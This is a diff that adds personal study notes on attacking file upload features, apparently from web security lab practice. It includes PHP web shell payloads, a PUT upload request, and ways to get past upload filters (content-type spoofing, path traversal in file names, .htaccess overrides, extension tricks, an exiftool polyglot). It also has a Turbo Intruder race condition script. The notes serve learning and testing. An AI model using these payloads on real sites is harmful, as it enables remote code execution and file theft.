@@ -1,1 +1,98 @@
+can result in DOS --> exremely large files
+code execution 
+file inclusion
+payload----> <?php echo file_get_contents('/path/to/target/file'); ?>
+             <?php echo system($_GET['command']); ?>
 
+##sometimes PUT can be used for file upload
+
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>####
+
+
+
+1. rce with file upload no restriction
+upload the file no restriction on content type or any extention
+
+++++++++++++++++++Flawed Validation of file type+++++++++++++++++++++++++++++++
+2.content type ---> application/x-www-form-url-encoded  ---> used for simple text
+                    multipart/form-data -----> used for images pdf executables or binary data
+
+when server only belives in headers sent bu client  
+eg conetnt type can be set to image/jpeg wehn sending data 
+no when we upload our file.php and send it it should give eroor confirming only images/jpeg is allowed
+then we can change it to image/jpg or image/png to bypass restriction
+
+
+3.directory with upload capabilities have much stricter controls on file types thereore sometimes we need some other folder
+which can be used to execute our web shell
+this can be done by renaming out file to add ../ at beginig
+
+eg-->  /sup/upload ---> no execution
+in proxy change name of web shell to ../shell.php    which gives     /sup/upload/../shell.php  ---> execution
+--> if not works use url encoding
+
+4. insufficient blacklisting of dangerous file types
+eg php is blacklisting we can use .php5 .phtml .shtml  etc other extention can be looked for other file types
+
+
+5. overriding server configuration using .htaccess----> apache or web.config ------> windows
+
+for .htacess ---> set Content-TYpe : text/plain
+upload a file with name .htaccess
+with followinf contents
+AddType application/x-httpd-php .l33t  -----> extention to uplload
+now we can upload any file with taht extention to execute our code
+
+6. obfuscating file extentions
+use Php pHp or other extention with small and capital characters
+using multiple extentions like .php.png or .png.php --> whichever works
+adding tarilig dots like shell.php. or spaces at end
+url encoding
+addinf semicollon or null byte to doble extentions   like shell.php;.png or shell.php%00.png
+also look for behaviuor of web app if it strips the file extentions like exploit.p.phphp --->php is stripped we get exploit.php
+
+
+7.Flawed validation of file types
+some web apps do not rely on content types in that we can do 
+1. add hex siganature like FF D8 FF for jpg files which the server can accept and then we can execute those scripts
+polyglot method --> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+both method does the same things they add payload within an image file which the server parses and executed if found
+
+8. using race condition  --> if source code is known
+
+if we have source code known and we know that the file is uploaded somewhere and kept for very small ammount of time we can execute our code in quick succession
+such that it will be executed we can use burp turbo intruder for that
+
+once we have turbo intruder we can paste the following code in python editor to attck our target in qucik succesion
+code===================
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+===========================================
+we acan then replcae our request with in above code  ----> both get and post 
+if we need we can change the value of no of request it can send
